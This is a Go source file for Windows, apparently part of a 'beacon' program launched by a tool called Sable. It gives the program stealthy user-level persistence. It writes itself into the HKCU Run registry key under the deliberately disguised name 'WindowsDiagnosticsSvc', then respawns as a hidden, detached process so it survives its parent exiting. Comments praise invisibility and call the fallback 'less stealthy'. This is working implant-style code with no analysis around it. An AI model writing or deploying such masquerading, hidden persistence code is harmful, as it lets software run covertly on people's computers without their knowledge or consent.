//go:build windows

package main

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

const DETACHED_PROCESS = 0x00000008

// ── User-Level Persistence (No Admin / No UAC) ─────────────
// Uses HKCU\Software\Microsoft\Windows\CurrentVersion\Run
// This key is writable by any standard user without elevation.
// The beacon registers itself here on first launch, then detaches
// from its parent process so it survives when Sable exits.

const runKeyPath = `Software\Microsoft\Windows\CurrentVersion\Run`

// EnsurePersistence writes the current executable path into the HKCU Run key
// so it launches automatically on user login. Requires no admin privileges.
func EnsurePersistence() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	exePath, _ = filepath.Abs(exePath)

	// Use a boring, native-looking value name
	entryName := "WindowsDiagnosticsSvc"

	// Command: run quietly in background, detached from any console
	cmd := `"` + exePath + `" -quiet`

	k, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		runKeyPath,
		registry.SET_VALUE|registry.QUERY_VALUE,
	)
	if err != nil {
		debugLog.Printf("%s persist: registry open failed: %v", logPrefix, err)
		return
	}
	defer k.Close()

	// Check if we're already registered with the correct path
	existing, _, err := k.GetStringValue(entryName)
	if err == nil && strings.TrimSpace(existing) == cmd {
		return // already persisted, nothing to do
	}

	if err := k.SetStringValue(entryName, cmd); err != nil {
		debugLog.Printf("%s persist: write failed: %v", logPrefix, err)
		return
	}

	debugLog.Printf(`%s persistence registered (HKCU\...\Run\%s)`, logPrefix, entryName)
}

// DetachFromParent respawns the beacon as an independent process and exits
// the current one. This breaks the parent-child relationship with Sable so
// the beacon survives when Sable closes.
//
// Uses CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS flags so the new process:
//   - Has no console window (invisible)
//   - Is not a child of the launching process
//   - Survives parent termination
func DetachFromParent() {
	// If we were launched with -quiet, we're already the detached child.
	// Don't fork again — that would create an infinite loop.
	if quiet {
		return
	}

	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// Build command line for the detached child
	args := []string{`"` + exePath + `"`, "-quiet"}
	if bridgeURL != "" {
		args = append(args, "-bridge", bridgeURL)
	}
	cmdLine := strings.Join(args, " ")

	// Windows API: CreateProcess with DETACHED_PROCESS
	// This is more reliable than exec.Command().Start() because it gives
	// us explicit control over process creation flags.
	si := new(syscall.StartupInfo)
	si.Cb = uint32(unsafe.Sizeof(*si))
	si.Flags = syscall.STARTF_USESHOWWINDOW
	si.ShowWindow = syscall.SW_HIDE // no window

	pi := new(syscall.ProcessInformation)

	// Convert command line to UTF16 pointer
	cmdPtr, err := syscall.UTF16PtrFromString(cmdLine)
	if err != nil {
		return
	}

	creationFlags := uint32(
		DETACHED_PROCESS | // no console inheritance
			CREATE_NEW_PROCESS_GROUP | // independent process group
			CREATE_NO_WINDOW, // absolutely no window
	)

	err = syscall.CreateProcess(
		nil,    // application name (use command line)
		cmdPtr, // command line
		nil,    // process security attributes
		nil,    // thread security attributes
		false,  // inherit handles: NO
		creationFlags,
		nil, // environment (inherit)
		nil, // current directory (inherit)
		si,
		pi,
	)
	if err != nil {
		debugLog.Printf("%s detach: CreateProcess failed: %v", logPrefix, err)
		return
	}

	// Close handles to the new process/thread — we don't need them
	syscall.CloseHandle(pi.Process)
	syscall.CloseHandle(pi.Thread)

	debugLog.Printf("%s detached child spawned (PID %d), parent exiting", logPrefix, pi.ProcessId)

	// Exit the current (Sable-launched) process cleanly.
	// The detached child continues running independently.
	os.Exit(0)
}

// Process creation flags not exposed in syscall package
const (
	CREATE_NEW_PROCESS_GROUP = 0x00000200
	CREATE_NO_WINDOW         = 0x08000000
)

// IsRunningAsService checks if the beacon was started by the OS (login)
// rather than by Sable. If parent PID doesn't exist or is explorer.exe,
// we're running independently.
func IsRunningAsService() bool {
	// Simple heuristic: if -quiet flag is set, we were launched by Run key
	return quiet
}

// FallbackDetach uses exec.Command as a fallback if CreateProcess fails.
// Less stealthy but functional.
func FallbackDetach() {
	if quiet {
		return
	}
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	cmd := exec.Command(exePath, "-quiet")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
	}
	if err := cmd.Start(); err != nil {
		return
	}
	// Release the child process so it's not tied to us
	cmd.Process.Release()
	os.Exit(0)
}
